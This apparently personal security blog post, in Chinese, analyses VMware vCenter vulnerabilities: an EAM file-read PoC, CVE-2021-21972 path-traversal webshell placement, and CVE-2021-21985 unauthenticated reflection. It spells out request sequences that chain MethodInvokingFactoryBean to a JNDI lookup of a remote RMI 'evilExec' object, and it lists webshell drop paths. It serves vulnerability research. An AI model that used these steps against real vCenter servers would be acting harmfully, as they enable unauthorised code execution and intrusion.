<!DOCTYPE html>
<html lang="zh-cn">
  <head><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="description" content="VMware vCenter漏洞分析（一）"/><meta name="keywords" content="research,analyze" /><link rel="alternate" href="/atom.xml" title="Blog" type="application/atom+xml"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
<link rel="canonical" href="https://hosch3n.github.io/2021/07/06/VMware-vCenter漏洞分析（一）/"/>

<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-180953397-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-180953397-1');
</script><script id="baidu_push">
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
<script>
  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":"","latex":false};
</script>

    <title>VMware vCenter漏洞分析（一） - Blog</title>
  <meta name="generator" content="Hexo 5.4.0"></head>

  <body><div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/." class="logo">Blog</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list"><a href="/">
        <li class="mobile-menu-item">首页
          </li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">标签
          </li>
      </a><a href="/categories/">
        <li class="mobile-menu-item">分类
          </li>
      </a><a href="/about/">
        <li class="mobile-menu-item">关于
          </li>
      </a></ul>
</nav>
<div class="container" id="mobile-panel">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/." class="logo">Blog</a>
</div>

<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
          <a class="menu-item-link" href="/">
            首页
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/tags/">
            标签
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/categories/">
            分类
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/about/">
            关于
            </a>
        </li>
      </ul></nav>
</header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content"><article class="post">
    <header class="post-header">
      <h1 class="post-title">VMware vCenter漏洞分析（一）
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2021-07-06
        </span><span class="post-category">
            <a href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
            </span>
        </div>
    </header>

    <div class="post-toc" id="post-toc">
    <h2 class="post-toc-title">文章目录</h2>
    <div class="post-toc-content">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD"><span class="toc-text">基础设施</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#File-Read"><span class="toc-text">File Read</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-21972"><span class="toc-text">CVE-2021-21972</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-21985"><span class="toc-text">CVE-2021-21985</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li></ol>
    </div>
  </div><div class="post-content"><h2 id="基础设施"><a href="#基础设施" class="headerlink" title="基础设施"></a>基础设施</h2><p>vSphere Client分为UI层、Java服务层、后端层，前端通过RESTful API与基于Spring MVC和OSGI框架的Java服务层进行通信。</p>
<p><img src="/img/vcenterldfx_a.png"></p>
<p>vCenter可以安装部署至ESXi，也可以导入镜像中的OVA文件部署，漏洞环境的ISO文件可从<a target="_blank" rel="noopener" href="https://blog.whsir.com/?s=%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8">此处</a>获取。需要注意的是VCSA的最小部署规格tiny（微型）需要2核10G内存300G硬盘，本文采用的方案为在ESXi的物理机上嵌套安装ESXi虚拟机，并在嵌套安装的ESXi虚拟机中安装VCSA。保持根路由与一级ESXi物理机VLAN为空（或不变/或为4095），将一级ESXi与二级ESXi的虚拟交换机设置为4095（或某个固定值），将二级ESXi中运行的VCSA接入二级虚拟交换机，并同时开启该链路上的各级交换机的混杂模式。</p>
<h2 id="File-Read"><a href="#File-Read" class="headerlink" title="File Read"></a>File Read</h2><p>由EAM用户运行的服务存在文件读取，Windows上可获取帐号密码。</p>
<p>影响版本：</p>
<ul>
<li>6.0 &lt;= vCenter Server &lt;= 6.5 f &lt; 6.5 u1</li>
</ul>
<p>POC：<code>https://1.1.1.1/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties</code></p>
<h2 id="CVE-2021-21972"><a href="#CVE-2021-21972" class="headerlink" title="CVE-2021-21972"></a>CVE-2021-21972</h2><p>默认启用的vROps插件（com.vmware.vropspluginui.mvc）ServicesController类的uploadova接口存在未授权访问，可利用路径穿越将文件解压至特定目录实现getshell。</p>
<p>影响版本：</p>
<ul>
<li>7.0 &lt;= vCenter Server &lt; 7.0 U1c</li>
<li>6.7 &lt;= vCenter Server &lt; 6.7 U3l</li>
<li>6.5 1e &lt;= vCenter Server &lt; 6.5 U3n</li>
<li>4.x &lt;= Cloud Foundation (vCenter Server) &lt; 4.2</li>
<li>3.x &lt;= Cloud Foundation (vCenter Server) &lt; 3.10.1.2</li>
</ul>
<p>EXP：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/49602">VMware vCenter Server 7.0 - Unauthenticated File Upload</a></p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>用root帐号ssh连上vCenter，找到vropsplugin-service.jar利用<code>python3 -m http.server 8010</code>下载到本地<a href="https://hosch3n.github.io/2021/05/29/CS43%E4%BC%AA%E7%A0%B4%E8%A7%A3%E4%B8%8E%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/#LV1">反编译</a>：</p>
<p><img src="/img/vcenterldfx_b.png"></p>
<p>从post上传的输入流中解析tar遍历文件，创建File类拼接目录时存在<code>../../</code>目录穿越，可将文件解压至vsphere-ui用户有权限的目录。切入该用户并查找可写目录：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su vsphere-ui</span><br><span class="line">find / -writable -<span class="built_in">type</span> d |&amp; grep -v <span class="string">&quot;Permission denied&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/vcenterldfx_c.png"></p>
<p><code>.ssh</code>可写就能上传公钥，并通过安装VCSA时通常都会开启的SSH服务连上来，但我们先看一下shadow文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /etc/shadow</span></span><br><span class="line">...</span><br><span class="line">vsphere-ui:!:18802:1:90:7:::</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>由冒号分隔的各项分别代表：</p>
<ul>
<li>用户名</li>
<li>哈希算法、盐、哈希密码</li>
<li>最后一次密码修改时间（距1970年1月1日天数）</li>
<li>最小密码修改间隔时间</li>
<li>密码过期时间</li>
<li>密码过期前警告时间</li>
<li>密码过期后宽限时间</li>
<li>账号失效时间</li>
<li>保留字段</li>
</ul>
<p>看到密码过期时间为90天，因此在安装90天后即使写入了公钥登录也会提示密码过期，需要提供原密码并修改密码：</p>
<p><img src="/img/vcenterldfx_d.png"></p>
<p>vsphere-ui用户的第二项为<code>!</code>，这表示该用户未设置密码（与空密码不同），所以也就没法修改密码。。。</p>
<p>写文件getshell需要充分利用各种服务，遍历找出存在有jsp的web.xml并与可写目录交叉对比：</p>
<p><img src="/img/vcenterldfx_e.png"></p>
<p>由<code>/usr/lib/vmware-vsphere-ui/server/configuration/tomcat-server.xml</code>查到监听端口为5090，再由rhttpproxy反向代理找到web访问路径：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># grep 5090 /etc/vmware-rhttpproxy/endpoints.conf.d/*</span></span><br><span class="line">/ui/healthstatus <span class="built_in">local</span> 5090 redirect allow</span><br><span class="line">/ui <span class="built_in">local</span> 5090 redirect allow</span><br></pre></td></tr></table></figure>

<ul>
<li>靠前的redirect表示将http重定向到https，后面的allow表示允许https访问</li>
<li><code>META-INF/MANIFEST.MF</code>中的<code>Web-ContextPath</code>也会标识web路径</li>
</ul>
<p>最后将webshell释放至<code>/usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/42/0/h5ngc.war/resources/</code>目录或其子目录，即可解析并由<code>https://1.1.1.1/ui/resources/webshell.jsp</code>访问</p>
<p>该路径中的42并非是固定数值，会随着重装重启等行为发生改变，所以构造上传包时可以暴力批量添加，并利用解压时的容错性释放。</p>
<p><img src="/img/vcenterldfx_f.png"></p>
<p>6.7U2及之后的版本，会在服务启动时判断如果存在work目录就删除，也就是说Web是跑在内存里面的。这时对于6.7U2及更新的6.7版本可以将webshell释放至<code>/usr/lib/vmware-vsphere-ui/server/static/resources/libs/</code>目录作为后门，待其重启后会被加载运行。对于7.0版本static后面的resources会跟一串动态数字路径，能够在请求的返回包中获取到。</p>
<ul>
<li>Windows由于权限控制并不严格，可以将webshell释放至<code>C:\ProgramData\VMware\vCenterServer\data\perfcharts\tc-instance\webapps\statsreport\</code>目录，会以system权限运行</li>
</ul>
<h2 id="CVE-2021-21985"><a href="#CVE-2021-21985" class="headerlink" title="CVE-2021-21985"></a>CVE-2021-21985</h2><p>默认启用的Virtual SAN Health Check插件（vsan-h5-client.zip）<code>/rest/*</code>接口存在未授权访问，可利用不安全的反射调用实现getshell。</p>
<p>影响版本：</p>
<ul>
<li>7.0 &lt;= vCenter Server &lt; 7.0 U2b</li>
<li>6.7 &lt;= vCenter Server &lt; 6.7 U3n</li>
<li>6.5 &lt;= vCenter Server &lt; 6.5 U3p</li>
<li>4.x &lt;= Cloud Foundation (vCenter Server) &lt; 4.2.1</li>
<li>3.x &lt;= Cloud Foundation (vCenter Server) &lt; 3.10.2.1</li>
</ul>
<p>EXP：<a target="_blank" rel="noopener" href="https://github.com/hosch3n/vCenterExp/blob/main/21985.py">vCenterExp</a></p>
<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>从官方通告能够猜到漏洞入口是vsan插件的未授权访问，为了减少干扰代码的影响，我们对漏洞修复前后的两个版本（VMware-VCSA-all-6.7.0-18010531、VMware-VCSA-all-6.7.0-17713310）进行对比分析。</p>
<p>挂载或解压对应ISO，将<code>VMware VCSA/vcsa</code>路径下的OVA文件导入虚拟机，由CUI开启ssh服务便于后续操作。</p>
<p><img src="/img/vcenterldfx_g.png"></p>
<p>用root帐号ssh连上vCenter，定位到vsan-h5-client插件再通过python httpserver下载。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># find / -name &#x27;*vsan*&#x27; | grep &#x27;h5&#x27;</span></span><br><span class="line">/usr/lib/vmware-vpx/vsan-health/ui-plugins/vsan-h5-client.zip</span><br><span class="line"></span><br><span class="line">python3 -m http.server -d /usr/lib/vmware-vpx/vsan-health/ui-plugins/ 8010</span><br></pre></td></tr></table></figure>

<p>不是我不知道scp这个东西，photon linux的特殊结构导致了没法直接用scp传输文件：</p>
<p><img src="/img/vcenterldfx_h.png"></p>
<p>至于为什么用8010端口，是因为严格的iptables规则中这个端口在白名单里而且没被占用。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># iptables -L</span></span><br><span class="line">Chain INPUT (policy DROP)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">ACCEPT     all  --  anywhere             anywhere            </span><br><span class="line">DROP       all  --  anywhere             anywhere             ctstate INVALID</span><br><span class="line">ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED</span><br><span class="line">inbound    all  --  anywhere             anywhere            </span><br><span class="line">port_filter  all  --  anywhere             anywhere            </span><br><span class="line">DROP       icmp --  anywhere             anywhere             icmp timestamp-request</span><br><span class="line">DROP       icmp --  anywhere             anywhere             icmp timestamp-reply</span><br><span class="line">ACCEPT     icmp --  anywhere             anywhere            </span><br><span class="line">DROP       udplite--  anywhere             anywhere            </span><br><span class="line"></span><br><span class="line">Chain FORWARD (policy DROP)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line"></span><br><span class="line">Chain OUTPUT (policy ACCEPT)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line"></span><br><span class="line">Chain inbound (1 references)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">RETURN     all  --  anywhere             anywhere            </span><br><span class="line"></span><br><span class="line">Chain port_filter (1 references)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:tungsten-https</span><br><span class="line">ACCEPT     udp  --  anywhere             anywhere             udp dpt:ideafarm-door</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ideafarm-door</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ldap</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ldaps</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:tmosms0</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:xinupageserver</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:troff</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:shell</span><br><span class="line">ACCEPT     udp  --  anywhere             anywhere             udp dpt:syslog</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:fujitsu-dtcns</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:5480</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:kerberos</span><br><span class="line">ACCEPT     udp  --  anywhere             anywhere             udp dpt:kerberos</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ttyinfo</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:8010</span><br></pre></td></tr></table></figure>

<p>分别将两个版本的压缩包下载下来解压，IDEA对比h5-vsan-context.jar，看到新版本中对<code>/rest/*</code>路径添加了<code>authenticationFilter</code>过滤器。</p>
<p><img src="/img/vcenterldfx_i.png"></p>
<p>具体类实现中拦截了未登录的请求，并返回401状态码：</p>
<p><img src="/img/vcenterldfx_j.png"></p>
<p>另一处变动是h5-vsan-service.jar中ProxygenController类的invokeService方法，通过isAnnotationPresent判断只有方法存在<code>TsService</code>接口才会反射调用，感觉就是设置方法白名单了。</p>
<p><img src="/img/vcenterldfx_k.png"></p>
<p>invokeService方法会被<code>invokeServiceWithJson</code>或<code>invokeServiceWithMultipartFormData</code>调用，两个方法都是从URL路径中取<code>beanIdOrClassName</code>和<code>methodName</code>的值、从HTTP请求体中取<code>methodInput</code>的值，并经过格式化处理后作为入参传给invokeService方法。</p>
<p><img src="/img/vcenterldfx_l.png"></p>
<p>invokeService方法反射获取类进而注入bean，反射获取所有public方法并遍历，通过ProxygenSerializer类的deserializeMethodInput转化为方法对象后反射调用。（6.7不同小版本的代码有细微差异）</p>
<p><img src="/img/vcenterldfx_m.png"></p>
<p>由21982的分析已经知道vCenter会由rhttpproxy反代复用端口，通过<code>META-INF/MANIFEST.MF</code>和<code>web.xml</code>可以知道vsan插件部署的Web路径为<code>ui/h5-vsan/rest/*</code>，再结合各级的RequestMapping路由映射注解，推出漏洞入口就是通过<code>https://1.1.1.1/ui/h5-vsan/rest/proxy/service/&#123;beanIdOrClassName&#125;/&#123;methodName&#125;</code>触发环境中类危险方法调用。有TP5的RCE那味了，但并不可以用Runtime.exec直接莽，因为getBean时只会在<code>beanMap</code>中查找，动态调试可以看到内存中加载的Map：</p>
<p><img src="/img/vcenterldfx_n.png"></p>
<ul>
<li>在<code>/etc/vmware/vmware-vmon/svcCfgfiles/vsphere-ui.json</code>中添加启动参数<code>-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8010</code>后执行<code>service-control --restart vsphere-ui</code>重启服务，IDEA中添加<code>Remote JVM Debug</code>配置<code>Attach to remote JVM</code>模式远程调试，如果不是用8010端口得开一下防火墙：<code>iptables -P INPUT ACCEPT</code></li>
</ul>
<p>所以接下来就是在一堆bean里查找危险方法构建利用链了，在<code>vsan-h5-client/plugins/h5-vsan-service/META-INF/spring/base/*.xml</code>配置文件中找到它们的定义，所有scope都是缺省的<code>singleton</code>而且没有配置<code>lazy-init</code>，也就是说这些bean都会在spring项目启动时单例加载。</p>
<p><img src="/img/vcenterldfx_o.png"></p>
<p>看到<code>org.springframework.beans.factory.config.MethodInvokingFactoryBean</code>方法和它的继承链，在<a target="_blank" rel="noopener" href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/beans/factory/config/MethodInvokingFactoryBean.html">官方API文档</a>可以清晰地看到其继承自父类MethodInvoker的多个方法：</p>
<p><img src="/img/vcenterldfx_p.png"></p>
<p>invoke方法源码如下，由<code>targetObject</code>、<code>preparedMethod</code>调用静态方法，<code>ReflectionUtils.makeAccessible</code>修改方法可见性，<code>getArguments</code>获取参数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">()</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException </span>&#123;</span><br><span class="line">	<span class="comment">// In the static case, target will simply be &#123;@code null&#125;.</span></span><br><span class="line">	Object targetObject = getTargetObject();</span><br><span class="line">	Method preparedMethod = getPreparedMethod();</span><br><span class="line">	<span class="keyword">if</span> (targetObject == <span class="keyword">null</span> &amp;&amp; !Modifier.isStatic(preparedMethod.getModifiers())) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Target method must not be non-static without a target&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	ReflectionUtils.makeAccessible(preparedMethod);</span><br><span class="line">	<span class="keyword">return</span> preparedMethod.invoke(targetObject, getArguments());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接调用静态方法并不需要<code>targetObject</code>，通过<code>setTargetObject</code>将其设置为null。<code>getArguments</code>取的就是<code>arguments</code>的值，可以通过<code>setArguments</code>将其设置为Obejct[]的JNDI远程方法（RMI/LDAP）。向上跟进<code>preparedMethod</code>可以看到如下反向调用链：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">preparedMethod</span><br><span class="line">    <span class="keyword">this</span>.methodObject</span><br><span class="line">        targetClass.getMethod(targetMethod, argTypes)</span><br><span class="line">            resolveClassName(className)</span><br><span class="line">                String className = <span class="keyword">this</span>.staticMethod.substring(<span class="number">0</span>, lastDotIndex)</span><br><span class="line">                String methodName = <span class="keyword">this</span>.staticMethod.substring(lastDotIndex + <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>至此这条利用链的入口和链尾已经成型：<code>&#123;beanIdOrClassName&#125;/&#123;methodName&#125; -&gt; ... -&gt; MethodInvokingFactoryBean -&gt; MethodInvoker -&gt; JNDI（javax.naming.InitialContext.doLookup） -&gt; 恶意RMI/LDAP服务器提供的远程对象</code>，搜索配置文件中class为<code>MethodInvokingFactoryBean</code>的bean就可以找到能作为连接链两端的部分：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vsanProviderUtils_setVmodlHelper</span><br><span class="line">vsanProviderUtils_setVsanServiceFactory</span><br><span class="line">vsanQueryUtil_setDataService</span><br><span class="line">vsanCapabilityUtils_setVsanCapabilityCacheManager</span><br><span class="line">vsanUtils_setMessageBundle</span><br><span class="line">vsanFormatUtils_setUserSessionService</span><br><span class="line">vsphereHealthProviderUtils_setVsphereHealthServiceFactory</span><br></pre></td></tr></table></figure>

<ul>
<li>bean配置中没写id时，name属性可以起到类似的作用</li>
</ul>
<p>直接调用FactoryBean实际上是其getObject方法返回的对象，而我们需要的是<code>MethodInvokingFactoryBean</code>自身，因此在调用这些bean时要在前面加上<code>&amp;</code>。利用bean饿汉式单例的特性，可以通过POST请求依次调用各个set方法赋值构造利用链：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&amp;&#123;beanName&#125;/setTargetObject</span><br><span class="line">&#123;<span class="attr">&quot;methodInput&quot;</span>:[<span class="literal">null</span>]&#125;</span><br><span class="line"></span><br><span class="line">&amp;&#123;beanName&#125;/setStaticMethod</span><br><span class="line">&#123;<span class="attr">&quot;methodInput&quot;</span>:[<span class="string">&quot;javax.naming.InitialContext.doLookup&quot;</span>]&#125;</span><br><span class="line"></span><br><span class="line">&amp;&#123;beanName&#125;/setArguments</span><br><span class="line">&#123;<span class="attr">&quot;methodInput&quot;</span>:[[<span class="string">&quot;rmi://1.1.1.1:1099/evilExec&quot;</span>]]&#125;</span><br><span class="line"></span><br><span class="line">&amp;&#123;beanName&#125;/prepare</span><br><span class="line">&#123;<span class="attr">&quot;methodInput&quot;</span>:[]&#125;</span><br><span class="line"></span><br><span class="line">&amp;&#123;beanName&#125;/invoke</span><br><span class="line">&#123;<span class="attr">&quot;methodInput&quot;</span>:[]&#125;</span><br></pre></td></tr></table></figure>

<p>但。。。是。。。随着vCenter版本的不断更新，其photon linux搭载的jdk版本也在不断更新，6.7初始版本的8u71可以直接打，中间更高些jdk版本可能就需要打rmi bypass或者ldap，到漏洞修复前一个小版本jdk已经是8u281了，<del>按照刚从火星回来的我肤浅的了解，目前似乎还没有公开的byapss 8u241+的方法（这里不是太确定，说错了欢迎拍砖）</del></p>
<p>而且vCenter通常部署在内网深处，不一定有那么好的出网环境加载恶意方法。回顾来看目前具有调用任意类任意静态方法的能力，被反向移植的jfr包的静态方法writeGeneratedASM中存在FileOutputStream，通过java.lang.System.setProperty静态方法将<code>SAVE_GENERATED</code>设置为true，这样就能将字节数组写入指定位置的以<code>.class</code>结尾的文件中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">writeGeneratedASM</span><span class="params">(String className, <span class="keyword">byte</span>[] bytes)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (SAVE_GENERATED == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// We can&#x27;t calculate value statically because it will force</span></span><br><span class="line">        <span class="comment">// initialization of SecuritySupport, which cause</span></span><br><span class="line">        <span class="comment">// UnsatisfiedLinkedError on JDK 8 or non-Oracle JDKs</span></span><br><span class="line">        SAVE_GENERATED = SecuritySupport.getBooleanProperty(<span class="string">&quot;jfr.save.generated.asm&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (SAVE_GENERATED) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> (FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(className + <span class="string">&quot;.class&quot;</span>)) &#123;</span><br><span class="line">                fos.write(bytes);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> (FileWriter fw = <span class="keyword">new</span> FileWriter(className + <span class="string">&quot;.asm&quot;</span>); PrintWriter pw = <span class="keyword">new</span> PrintWriter(fw)) &#123;</span><br><span class="line">                ClassReader cr = <span class="keyword">new</span> ClassReader(bytes);</span><br><span class="line">                CheckClassAdapter.verify(cr, <span class="keyword">true</span>, pw);</span><br><span class="line">            &#125;</span><br><span class="line">            Logger.log(LogTag.JFR_SYSTEM_BYTECODE, LogLevel.INFO, <span class="string">&quot;Instrumented code saved to &quot;</span> + className + <span class="string">&quot;.class and .asm&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            Logger.log(LogTag.JFR_SYSTEM_BYTECODE, LogLevel.INFO, <span class="string">&quot;Could not save instrumented code, for &quot;</span> + className + <span class="string">&quot;.class and .asm&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但输入参数都会被ProxygenSerializer类的deserializeMethodInput方法格式化成<code>Object[]</code>，要怎么得到<code>byte[]</code>类型的参数呢。巧的是当<code>prepare</code>时<code>argTypes</code>类型不正确导致的异常，会经由以下调用栈并最终转化为需要的byte数组Orz：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.findMatchingMethod</span><br><span class="line">	org.springframework.beans.support.ArgumentConvertingMethodInvoker.doFindMatchingMethod</span><br><span class="line">		TypeConverter.convertIfNecessary</span><br></pre></td></tr></table></figure>

<p>再利用tomcat中的静态方法<a target="_blank" rel="noopener" href="https://tomcat.apache.org/tomcat-8.5-doc/api/org/apache/catalina/manager/ManagerServlet.html#copyInternal-java.io.File-java.io.File-byte:A-">copyInternal</a>即可实现对写入的<code>.class</code>文件的拷贝和重命名。没有能未授权访问且解析jsp的地方时，可以利用JNI机制由System.load加载native方法调用上传的恶意so，不过如果目标不出网也不好解决命令回显的问题。</p>
